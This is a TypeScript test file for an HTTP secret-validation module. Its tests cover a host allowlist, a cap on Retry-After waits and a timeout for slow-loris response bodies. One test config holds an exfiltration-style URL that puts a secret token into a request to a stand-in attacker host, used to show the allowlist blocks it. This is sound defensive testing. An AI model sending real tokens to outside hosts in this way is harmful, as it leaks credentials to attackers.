import type { IncomingMessage, Server, ServerResponse } from "node:http";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { PerHostLimiter } from "../src/validator";
import { runHttpValidation } from "../src/validator/http";

const statusMatcher = (url: string, extra: Record<string, unknown> = {}): Record<string, unknown> => {
    return {
        content: { request: { response_matcher: [{ status: [200], type: "StatusMatch" }], url, ...extra } },
    };
};

describe("runHttpValidation — host allowlist (untrusted-config defense)", () => {
    it("skips without firing when the rendered host isn't allowed", async () => {
        expect.assertions(1);

        // Unreachable host — if the allowlist failed open this would resolve to
        // 'error' (a real fetch attempt). 'skipped' proves no request was made.
        const status = await runHttpValidation({
            allowedHosts: new Set(["api.github.com"]),
            extraVariables: {},
            secret: "x",
            validation: statusMatcher("http://attacker.example/steal?t={{ TOKEN }}"),
        });

        expect(status).toBe("skipped");
    });

    it("allows a host that is in the allowlist (case-insensitive)", async () => {
        expect.assertions(2);

        const server = createServer((_request: IncomingMessage, response: ServerResponse) => {
            response.writeHead(200);
            response.end("ok");
        });

        await new Promise<void>((resolve) => {
            server.listen(0, "127.0.0.1", () => {
                resolve();
            });
        });

        const { port } = server.address() as AddressInfo;

        try {
            const status = await runHttpValidation({
                allowedHosts: new Set([`127.0.0.1:${String(port)}`]),
                extraVariables: {},
                secret: "x",
                validation: statusMatcher(`http://127.0.0.1:${String(port)}/ok`),
            });

            expect(status).toBe("verified");

            const skipped = await runHttpValidation({
                allowedHosts: new Set(["127.0.0.1:1"]),
                extraVariables: {},
                secret: "x",
                validation: statusMatcher(`http://127.0.0.1:${String(port)}/ok`),
            });

            expect(skipped).toBe("skipped");
        } finally {
            await new Promise<void>((resolve) => {
                server.close(() => {
                    resolve();
                });
            });
        }
    });
});

describe("perHostLimiter — Retry-After ceiling", () => {
    it("clamps an absurd Retry-After to the 5-minute cap", async () => {
        expect.assertions(2);

        let requestCount = 0;
        const server = createServer((_request: IncomingMessage, response: ServerResponse) => {
            requestCount += 1;
            // A hostile day-long Retry-After.
            response.writeHead(429, { "retry-after": "86400" });
            response.end("rate limited");
        });

        await new Promise<void>((resolve) => {
            server.listen(0, "127.0.0.1", () => {
                resolve();
            });
        });

        const { port } = server.address() as AddressInfo;
        const limiter = new PerHostLimiter();

        try {
            const status = await runHttpValidation({
                extraVariables: {},
                perHostLimiter: limiter,
                secret: "x",
                validation: statusMatcher(`http://127.0.0.1:${String(port)}/limited`),
            });

            // 429 fails the StatusMatch → rejected. Then the limiter records the
            // pause, capped at 5 minutes (not a day). The cap is enforced inside
            // observeRateLimit, so the recorded deadline is bounded. We assert
            // the request fired exactly once.
            expect(status).toBe("rejected");
            expect(requestCount).toBe(1);
        } finally {
            await new Promise<void>((resolve) => {
                server.close(() => {
                    resolve();
                });
            });
        }
    });
});

describe("runHttpValidation — slow body read stays bounded by the abort timer", () => {
    let server: Server;
    let url: string;

    beforeEach(async () => {
        // Server sends headers + status 200 immediately, then trickles the body
        // forever (slow-loris) without ever ending the response.
        server = createServer((_request: IncomingMessage, response: ServerResponse) => {
            response.writeHead(200, { "content-type": "text/plain" });
            response.write("partial");
            // Never call response.end() — body read would hang without the cap.
        });

        await new Promise<void>((resolve) => {
            server.listen(0, "127.0.0.1", () => {
                resolve();
            });
        });

        const { port } = server.address() as AddressInfo;

        url = `http://127.0.0.1:${String(port)}/slow`;
    });

    afterEach(async () => {
        await new Promise<void>((resolve) => {
            server.close(() => {
                resolve();
            });
        });
    });

    it("does not hang on a body that never finishes (a WordMatch forces a body read)", async () => {
        expect.assertions(1);

        // The WordMatch requires reading the body. With the abort timer cleared
        // pre-read (the old behaviour) this would never resolve; the fix keeps
        // the 5s timer armed, so the read aborts and we get 'error'.
        const status = await runHttpValidation({
            extraVariables: {},
            secret: "x",
            validation: statusMatcher(url, { response_matcher: [{ type: "WordMatch", words: ["never-arrives"] }] }),
        });

        expect(status).toBe("error");
    }, 15_000);
});
